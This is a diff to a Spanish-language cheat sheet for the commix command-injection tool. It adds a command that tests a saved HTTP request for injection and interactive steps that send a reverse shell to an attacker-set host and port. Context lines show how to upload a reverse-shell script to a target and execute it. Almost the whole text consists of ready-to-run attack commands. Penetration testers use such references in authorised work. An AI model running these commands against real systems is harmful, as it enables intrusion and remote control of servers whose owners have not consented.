@@ -5,6 +5,11 @@
 commix -u <URL>
 ```
 
+#### Leer un request y revisar si es vulnerable a inyección de comandos
+```
+commix -r <REQUEST-FILE>
+```
+
 #### Obtener toda la información básica del objetivo
 ```
 commix -u <URL> --all
@@ -48,6 +53,16 @@ commix -u <URL> --cookie="<COOKIE>" --data="ip=127.0.0.1&Submit=Submit"
 #### Cargar una reverse shell y ejecutarla
 ```
 commix -u <URL> --cookie="<COOKIE>" --data="ip=127.0.0.1&Submit=Submit" --file-write="/root/revshell.sh" --file-dest="/tmp/revshell.sh" --os-cmd="bash /tmp/revshell.sh"
+```
+
+#### Enviar un reverse shell estando dentro del equipo con commix
+```
+commix(os_shell)> reverse_tcp
+commix(os_shell)> set lhost <IP-ADDRESS>
+commix(os_shell)> set lport <PORT>
+commix(os_shell)> 1
+...
+commix(os_shell)> 3
 ```
 
 ---
